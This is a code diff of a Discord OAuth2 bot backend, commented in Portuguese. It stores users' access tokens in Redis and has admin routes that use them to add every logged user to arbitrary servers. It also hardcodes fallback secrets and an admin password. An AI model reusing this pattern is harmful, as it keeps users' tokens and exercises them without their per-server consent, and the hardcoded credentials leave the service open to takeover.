@@ -20,34 +20,21 @@ const API_SECRET     = process.env.API_SECRET     || 'wht-secret-2025';
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin-wht-2025';
 const CANAL_ID       = process.env.CANAL_ID       || '1498452626357096489';
 
-// ─── BOTS CADASTRADOS ─────────────────────────────────────────
-// Cada bot tem sua própria rota: /bot1, /bot2, /bot3 ...
-// Configure as variáveis de ambiente no Vercel para cada bot:
-//
-//   BOT1_CLIENT_ID, BOT1_CLIENT_SECRET, BOT1_REDIRECT_URI,
-//   BOT1_BOT_TOKEN, BOT1_GUILD_ID, BOT1_CARGO_ID, BOT1_NAME
-//
-//   BOT2_CLIENT_ID, BOT2_CLIENT_SECRET, ...
-//   BOT3_CLIENT_ID, BOT3_CLIENT_SECRET, ...
-//
-// Para adicionar mais bots, basta adicionar mais entradas aqui
-// e configurar as variáveis correspondentes no Vercel.
-
 function getBotsConfig() {
   const bots = {};
   for (let i = 1; i <= 10; i++) {
     const prefix = `BOT${i}_`;
     const clientId = process.env[`${prefix}CLIENT_ID`];
-    if (!clientId) continue; // bot não configurado, pula
+    if (!clientId) continue;
     bots[`bot${i}`] = {
-      id:           `bot${i}`,
-      name:         process.env[`${prefix}NAME`]         || `Bot ${i}`,
-      client_id:    clientId,
-      client_secret:process.env[`${prefix}CLIENT_SECRET`]|| '',
-      redirect_uri: process.env[`${prefix}REDIRECT_URI`] || '',
-      bot_token:    process.env[`${prefix}BOT_TOKEN`]    || '',
-      guild_id:     process.env[`${prefix}GUILD_ID`]     || '',
-      cargo_id:     process.env[`${prefix}CARGO_ID`]     || '',
+      id:            `bot${i}`,
+      name:          process.env[`${prefix}NAME`]          || `Bot ${i}`,
+      client_id:     clientId,
+      client_secret: process.env[`${prefix}CLIENT_SECRET`] || '',
+      redirect_uri:  process.env[`${prefix}REDIRECT_URI`]  || '',
+      bot_token:     process.env[`${prefix}BOT_TOKEN`]     || '',
+      guild_id:      process.env[`${prefix}GUILD_ID`]      || '',
+      cargo_id:      process.env[`${prefix}CARGO_ID`]      || '',
     };
   }
   return bots;
@@ -167,7 +154,6 @@ app.get('/api/admin/stats', adminAuth, async (req, res) => {
       ? (typeof extrasRaw === 'string' ? JSON.parse(extrasRaw) : extrasRaw)
       : [];
 
-    // Stats por bot
     const botStats = {};
     for (const [botId, cfg] of Object.entries(bots)) {
       botStats[botId] = {
@@ -186,13 +172,13 @@ app.get('/api/admin/stats', adminAuth, async (req, res) => {
       servidores_extras: extras.length,
       bots:              Object.values(botStats),
       usuarios: logs.map(e => ({
-        user_id:  e.user_id,
-        username: e.username,
-        avatar:   e.avatar,
-        tem_token:!!e.access_token,
-        bot_id:   e.bot_id   || null,
-        bot_name: e.bot_name || null,
-        ts:       e.ts,
+        user_id:   e.user_id,
+        username:  e.username,
+        avatar:    e.avatar,
+        tem_token: !!e.access_token,
+        bot_id:    e.bot_id   || null,
+        bot_name:  e.bot_name || null,
+        ts:        e.ts,
       })),
     });
   } catch (err) {
@@ -261,9 +247,8 @@ app.post('/api/admin/mover-todos', adminAuth, async (req, res) => {
   const { guild_id, bot_id } = req.body;
   if (!guild_id) return res.status(400).json({ error: 'guild_id obrigatorio' });
 
-  // Pega o bot_token do bot especificado (ou do primeiro bot configurado)
   const bots = getBotsConfig();
-  let bot_token = process.env.BOT_TOKEN; // fallback legado
+  let bot_token = process.env.BOT_TOKEN;
   if (bot_id && bots[bot_id]) {
     bot_token = bots[bot_id].bot_token;
   } else if (Object.keys(bots).length > 0) {
@@ -297,7 +282,7 @@ function fmtData(dt) {
   return `${dt.getDate()} de ${MESES[dt.getMonth()]} de ${dt.getFullYear()} ${String(dt.getHours()).padStart(2,'0')}:${String(dt.getMinutes()).padStart(2,'0')}`;
 }
 
-// ─── FUNÇÃO OAUTH2 (usada por todas as rotas de bot) ──────────
+// ─── FUNÇÃO OAUTH2 ────────────────────────────────────────────
 async function handleOAuth2(req, res, botCfg) {
   const code = req.query.code;
   if (!code) return res.send(`OAuth2 WHT — ${botCfg.name} Online ✅`);
@@ -329,7 +314,7 @@ async function handleOAuth2(req, res, botCfg) {
     });
     const user = await userRes.json();
 
-    // Salvar no Redis (com bot_id e bot_name)
+    // Salvar no Redis
     try {
       await salvarLog(user, tokenData.access_token, botCfg.id, botCfg.name);
     } catch (err) {
@@ -340,7 +325,8 @@ async function handleOAuth2(req, res, botCfg) {
       ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=512`
       : `https://cdn.discordapp.com/embed/avatars/0.png`;
 
-    // Adicionar ao servidor principal do bot
+    // Adicionar ao servidor PRINCIPAL do bot (apenas este)
+    // ✅ SERVIDORES EXTRAS são movidos manualmente via painel (🎯 Executar)
     try {
       await fetch(`https://discord.com/api/guilds/${botCfg.guild_id}/members/${user.id}`, {
         method: 'PUT',
@@ -349,23 +335,6 @@ async function handleOAuth2(req, res, botCfg) {
       });
     } catch (err) {
       console.log('[Aviso] Falha ao adicionar ao servidor:', err.message);
-    }
-
-    // Adicionar aos servidores extras
-    try {
-      const extrasRaw = await redis.get('servidores_extras');
-      const extras = extrasRaw
-        ? (typeof extrasRaw === 'string' ? JSON.parse(extrasRaw) : extrasRaw)
-        : [];
-      for (const guildId of extras) {
-        await fetch(`https://discord.com/api/guilds/${guildId}/members/${user.id}`, {
-          method: 'PUT',
-          headers: { 'Authorization': `Bot ${botCfg.bot_token}`, 'Content-Type': 'application/json' },
-          body: JSON.stringify({ access_token: tokenData.access_token }),
-        });
-      }
-    } catch (err) {
-      console.log('[Aviso] Falha nos servidores extras:', err.message);
     }
 
     // Enviar notificação no Discord
@@ -453,7 +422,6 @@ async function handleOAuth2(req, res, botCfg) {
 }
 
 // ─── ROTAS DINÂMICAS DOS BOTS ────────────────────────────────
-// Cada bot tem sua própria rota: /bot1, /bot2, /bot3 ...
 for (let i = 1; i <= 10; i++) {
   app.get(`/bot${i}`, async (req, res) => {
     const bots = getBotsConfig();
@@ -468,7 +436,6 @@ app.get('/', async (req, res) => {
   const code = req.query.code;
   if (!code) return res.send('OAuth2 Backend WHT - Online ✅ | Admin: /admin');
 
-  // Compatibilidade: rota / usa variáveis legadas BOT_TOKEN, CLIENT_ID, etc.
   const legacyCfg = {
     id:            'bot1',
     name:          'WHT Bot Principal',
@@ -482,7 +449,7 @@ app.get('/', async (req, res) => {
   await handleOAuth2(req, res, legacyCfg);
 });
 
-// ─── API EXTERNA (bots externos consultam) ───────────────────
+// ─── API EXTERNA ─────────────────────────────────────────────
 app.get('/api/logs', async (req, res) => {
   if (req.headers['x-api-secret'] !== API_SECRET)
     return res.status(401).json({ error: 'Unauthorized' });
